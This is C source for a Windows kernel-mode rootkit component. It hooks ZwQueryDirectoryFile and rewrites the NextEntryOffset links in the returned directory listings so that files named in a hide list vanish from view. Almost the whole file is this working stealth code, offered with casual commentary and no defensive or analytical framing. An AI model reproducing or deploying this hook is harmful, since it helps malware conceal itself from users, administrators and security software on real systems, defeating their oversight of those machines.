#include <ntddk.h>
#include "file.h"
#include "disk.h"

typedef unsigned char BYTE, *PBYTE;

WCHAR *FileToHide[128];
ULONG NbFileToHide=0;

/*
       ZwQueryDirectoryFile hook, DKOM type.
*/

ZWQUERYDIRECTORYFILE ZwQueryDirectoryFileAddress = NULL;

NTSTATUS ZwQueryDirectoryFileHook(
		IN HANDLE FileHandle,
		IN HANDLE Event OPTIONAL,
		IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
		IN PVOID ApcContext OPTIONAL,
		OUT PIO_STATUS_BLOCK IoStatusBlock,
		OUT PVOID FileInformation,
		IN ULONG FileInformationLength,
		IN FILE_INFORMATION_CLASS FileInformationClass,
		IN BOOLEAN ReturnSingleEntry,
		IN PUNICODE_STRING FileName OPTIONAL,
		IN BOOLEAN RestartScan
)
{
     NTSTATUS status;
     ULONG NameOffset;
     ULONG NameSizeOffset;
     WCHAR *FileNamePtr;
     PULONG FileNameLength;
     PBYTE curr, prev;
     PULONG DeltaCurr, DeltaPrev;
     UNICODE_STRING UnicodeFilename ;
     ULONG i;
        
     status = ((ZWQUERYDIRECTORYFILE)(ZwQueryDirectoryFileAddress)) (
           FileHandle,
           Event,
           ApcRoutine,
           ApcContext,
           IoStatusBlock,
           FileInformation,
           FileInformationLength,
           FileInformationClass,
           ReturnSingleEntry,
           FileName,
           RestartScan);       
     
     if( !NT_SUCCESS(status) )
        return status;

     curr = FileInformation;    
        
     switch( FileInformationClass )
     {
        /*     
            we get, for any structure, the offset of the filename and filename size
            so we have to write only 1 hook routine :)
        */     
        case FileDirectoryInformation:
             NameOffset = ((ULONG)&(((PFILE_DIRECTORY_INFORMATION)curr)->FileName)) - ((ULONG)curr);
             NameSizeOffset = ((ULONG)&(((PFILE_DIRECTORY_INFORMATION)curr)->FileNameLength)) 
                               - ((ULONG)curr);      
             break;

        case FileFullDirectoryInformation:
             NameOffset = ((ULONG)&(((PFILE_FULL_DIR_INFORMATION)curr)->FileName)) - ((ULONG)curr);
             NameSizeOffset = ((ULONG)&(((PFILE_FULL_DIR_INFORMATION)curr)->FileNameLength)) 
                               - ((ULONG)curr);           
             break;

        case FileBothDirectoryInformation:
             NameOffset = ((ULONG)&(((PFILE_BOTH_DIR_INFORMATION)curr)->FileName)) - ((ULONG)curr);
             NameSizeOffset = ((ULONG)&(((PFILE_BOTH_DIR_INFORMATION)curr)->FileNameLength)) 
                               - ((ULONG)curr);       
             break;

        case FileNamesInformation:
             NameOffset = ((ULONG)&(((PFILE_NAMES_INFORMATION)curr)->FileName)) - ((ULONG)curr);
             NameSizeOffset = ((ULONG)&(((PFILE_NAMES_INFORMATION)curr)->FileNameLength)) 
                               - ((ULONG)curr);         
             break;
             
        case FileIdBothDirectoryInformation:
             NameOffset = ((ULONG)&(((PFILE_ID_BOTH_DIR_INFORMATION)curr)->FileName)) - ((ULONG)curr);
             NameSizeOffset = ((ULONG)&(((PFILE_ID_BOTH_DIR_INFORMATION)curr)->FileNameLength)) 
                               - ((ULONG)curr); 
             break;
        
        case FileIdFullDirectoryInformation:
             NameOffset = ((ULONG)&(((PFILE_ID_FULL_DIR_INFORMATION)curr)->FileName)) - ((ULONG)curr);
             NameSizeOffset = ((ULONG)&(((PFILE_ID_FULL_DIR_INFORMATION)curr)->FileNameLength)) 
                               - ((ULONG)curr);   
             
             break;        

       default:
             // this isn't an interesting ZwQueryDirectoryFile call
             return status;      
     }  
     
     /*
        Now we can apply, as for process, a DKOM hook. For any struct, the first 
        element is the NextEntryDelta.
        we can easily get and modify it :)
     */    
     
     
     for(i=0; i<NbFileToHide; i++) {
        
        curr = FileInformation;  
        
        prev = NULL;
        while( curr ) {
        
           // we get the NextEntryOffsets
           DeltaCurr = (PULONG)curr;
           DeltaPrev = (PULONG)prev;
        
           FileNamePtr = (WCHAR*)((PBYTE)curr + NameOffset);
           FileNameLength = (PULONG) ((PBYTE)curr + NameSizeOffset);         
              
           if( FileNamePtr!=NULL && *FileNameLength == wcslen(FileToHide[i])*2 &&
               !memcmp(FileNamePtr,FileToHide[i],(SIZE_T)*FileNameLength))
           {    

              // file to hide   
              
              if( !prev ) {
                  // we are first of the list
                  if( *DeltaCurr )
                     // there's a next entry
                     (PBYTE)FileInformation += *DeltaCurr;
                  else
                     FileInformation = NULL;   
              }
              else {
                  // there's an entry before 
                  if( *DeltaCurr )
                     // NextEntryOffset of the previous entry "points" to the next
                     *DeltaPrev += *DeltaCurr; 
                  else
                     // we're last file
                     *DeltaPrev = 0;   
              }    
           }        
           else 
              // if curr is not to hide, prev becomes curr :)
              prev = curr;
        
           if( *DeltaCurr )  
              curr += *DeltaCurr;
           else  
              curr = NULL;
            
        } // while
     } // for
        
     
     return status;
}


